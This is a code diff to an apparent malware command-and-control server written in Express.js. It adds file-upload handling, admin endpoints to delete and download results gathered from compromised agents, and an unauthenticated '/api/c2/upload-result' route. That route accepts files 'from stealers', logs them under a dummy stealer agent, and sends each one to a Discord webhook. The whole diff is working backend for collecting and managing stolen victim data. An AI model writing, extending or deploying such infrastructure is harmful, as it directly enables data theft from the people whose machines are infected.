@@ -7,6 +7,7 @@ import fetch from 'node-fetch';
 import path from 'path';
 import crypto from 'crypto';
 import fs from 'fs';
+import multer from 'multer';
 
 // --- App Configuration ---
 const app = express();
@@ -38,6 +39,30 @@ if (!dbConfig.host || !dbConfig.user || !dbConfig.password || !dbConfig.database
 app.use(express.json());
 app.use(cors({ origin: true, credentials: true }));
 app.use('/download', express.static('/home/ubuntu/public/downloads'));
+
+// --- File Upload Setup ---
+const uploadDir = path.join(process.cwd(), 'uploads');
+console.log('Upload directory configured as:', uploadDir);
+
+if (!fs.existsSync(uploadDir)) {
+    console.log('Creating upload directory...');
+    fs.mkdirSync(uploadDir, { recursive: true });
+    console.log('Upload directory created at:', uploadDir);
+}
+
+const storage = multer.diskStorage({
+    destination: function (req, file, cb) {
+        console.log('Receiving file:', file.originalname);
+        cb(null, uploadDir);
+    },
+    filename: function (req, file, cb) {
+        const uniqueName = `${Date.now()}-${file.originalname}`;
+        console.log('Saving file as:', uniqueName);
+        cb(null, uniqueName);
+    }
+});
+
+const upload = multer({ storage: storage });
 
 // --- Services ---
 let pool;
@@ -1038,6 +1063,47 @@ app.get('/api/admin/c2/results', authenticateAdmin, async (req, res) => {
     }
 });
 
+// Delete Result (Admin)
+app.delete('/api/admin/c2/results/:resultId', authenticateAdmin, async (req, res) => {
+    if (!dbReady) return res.status(503).json({ error: "Database not available" });
+
+    const { resultId } = req.params;
+
+    try {
+        // First get the file path if it exists
+        const [result] = await pool.query(
+            "SELECT file_path FROM c2_results WHERE id = ?",
+            [resultId]
+        );
+
+        // Delete the result from database
+        const [deleteResult] = await pool.query(
+            "DELETE FROM c2_results WHERE id = ?",
+            [resultId]
+        );
+
+        if (deleteResult.affectedRows === 0) {
+            return res.status(404).json({ error: 'Result not found' });
+        }
+
+        // If there was a file associated with this result, delete it
+        if (result.length > 0 && result[0].file_path) {
+            const filePath = path.join(__dirname, result[0].file_path);
+            if (fs.existsSync(filePath)) {
+                fs.unlinkSync(filePath);
+            }
+        }
+
+        res.json({ 
+            status: 'success', 
+            message: 'Result deleted successfully'
+        });
+    } catch (error) {
+        console.error('Error deleting result:', error);
+        res.status(500).json({ error: 'Internal server error' });
+    }
+});
+
 // 6. Create Command (Admin)
 app.post('/api/admin/c2/command', authenticateAdmin, async (req, res) => {
     if (!dbReady) return res.status(503).json({ error: "Database not available" });
@@ -1069,17 +1135,52 @@ app.post('/api/admin/c2/command', authenticateAdmin, async (req, res) => {
 app.get('/api/admin/c2/download/:agentId/:filename', authenticateAdmin, async (req, res) => {
     const { agentId, filename } = req.params;
     
+    console.log('Download request received:', {
+        agentId,
+        filename,
+        headers: req.headers,
+        auth: req.headers.authorization ? 'Present' : 'Missing'
+    });
+    
     try {
-        const filePath = path.join(__dirname, 'uploads', 'c2', agentId, filename);
+        // Get the relative file path from the database
+        const [results] = await pool.query(
+            'SELECT file_path FROM c2_results WHERE agent_id = ? AND file_path LIKE ?',
+            [agentId, `%${filename}`]
+        );
+
+        console.log('Database query results:', { results });
+
+        if (results.length === 0) {
+            console.error(`File not found in database: agent=${agentId}, filename=${filename}`);
+            return res.status(404).json({ error: 'File not found in database' });
+        }
+
+        const relativePath = results[0].file_path;
+        const absolutePath = path.resolve(__dirname, relativePath);
+        console.log('File paths:', { relativePath, absolutePath, __dirname });
         
-        if (fs.existsSync(filePath)) {
-            res.download(filePath);
+        if (fs.existsSync(absolutePath)) {
+            console.log('File exists, attempting to send...');
+            res.setHeader('Content-Type', 'application/octet-stream');
+            res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
+            
+            const fileStream = fs.createReadStream(absolutePath);
+            fileStream.on('error', (err) => {
+                console.error('Error streaming file:', err);
+                if (!res.headersSent) {
+                    res.status(500).json({ error: 'Error streaming file' });
+                }
+            });
+            
+            fileStream.pipe(res);
         } else {
-            res.status(404).json({ error: 'File not found' });
+            console.error(`File exists in database but not on disk: ${absolutePath}`);
+            res.status(404).json({ error: 'File not found on disk' });
         }
     } catch (error) {
-        console.error('Error downloading file:', error);
-        res.status(500).json({ error: 'Internal server error' });
+        console.error('Error processing download request:', error);
+        res.status(500).json({ error: 'Internal server error', details: error.message });
     }
 });
 
@@ -1297,6 +1398,98 @@ app.post('/api/c2/bulk-upload/:agentId', async (req, res) => {
     } catch (error) {
         console.error('Error during bulk upload:', error);
         res.status(500).json({ error: 'Internal server error' });
+    }
+});
+
+// Endpoint for file uploads from stealers to appear in results
+app.post('/api/c2/upload-result', upload.single('file'), async (req, res) => {
+    console.log('Received upload request');
+    
+    if (!req.file) {
+        console.error('No file received in request');
+        return res.status(400).send({ message: 'No file uploaded.' });
+    }
+
+    // Convert absolute path to relative path for storage
+    const relativePath = path.relative(__dirname, req.file.path);
+    console.log('File received:', {
+        ...req.file,
+        relativePath
+    });
+    
+    // Send immediate response
+    res.status(200).send({
+        message: 'File uploaded successfully.',
+        filename: req.file.filename,
+        path: relativePath
+    });
+
+    // Handle database operations asynchronously
+    const DUMMY_AGENT_ID = 'stealer-upload-bot';
+
+    try {
+        if (!dbReady) {
+            console.error('Database not ready');
+            return;
+        }
+
+        const conn = await pool.getConnection();
+        try {
+            console.log('Creating/updating dummy agent...');
+            // 1. Ensure our dummy agent exists
+            await conn.query(`
+                INSERT INTO c2_agents (agent_id, hostname, username, os_info, ip_address, status)
+                VALUES (?, 'N/A', 'N/A', 'File Stealer', ?, 'active')
+                ON DUPLICATE KEY UPDATE last_seen = CURRENT_TIMESTAMP;
+            `, [DUMMY_AGENT_ID, req.ip]);
+
+            console.log('Creating dummy command...');
+            // 2. Create a dummy command to associate the result with
+            const [cmdInsert] = await conn.query(`
+                INSERT INTO c2_commands (agent_id, command_type, command_data, status, executed_at, completed_at)
+                VALUES (?, 'collect_files', 'Automated file drop', 'completed', NOW(), NOW());
+            `, [DUMMY_AGENT_ID]);
+            
+            const commandId = cmdInsert.insertId;
+            console.log('Command created with ID:', commandId);
+
+            console.log('Creating result record...');
+            // 3. Create the actual result record
+            await conn.query(`
+                INSERT INTO c2_results (command_id, agent_id, result_data, file_path, file_size, success)
+                VALUES (?, ?, ?, ?, ?, ?);
+            `, [
+                commandId,
+                DUMMY_AGENT_ID,
+                'File uploaded from external stealer.',
+                relativePath,  // Store relative path instead of absolute
+                req.file.size,
+                true
+            ]);
+
+            // Optionally, log file upload to Discord
+            const webhookData = {
+                content: `📦 New file result from **${DUMMY_AGENT_ID}**: **${req.file.originalname}**`,
+                embeds: [{
+                    title: 'File Upload Details',
+                    color: 0x00ff00,
+                    fields: [
+                        { name: 'Original Name', value: req.file.originalname, inline: true },
+                        { name: 'Size', value: `${(req.file.size / 1024).toFixed(2)} KB`, inline: true },
+                        { name: 'Saved Path', value: relativePath, inline: false },
+                    ]
+                }]
+            };
+            webhook.send(webhookData).catch(err => console.error('Error sending Discord notification:', err));
+
+            console.log('Database operations completed successfully');
+        } catch (error) {
+            console.error('Failed to process database operations:', error);
+        } finally {
+            conn.release();
+        }
+    } catch (error) {
+        console.error('Failed to process file upload result:', error);
     }
 });
 
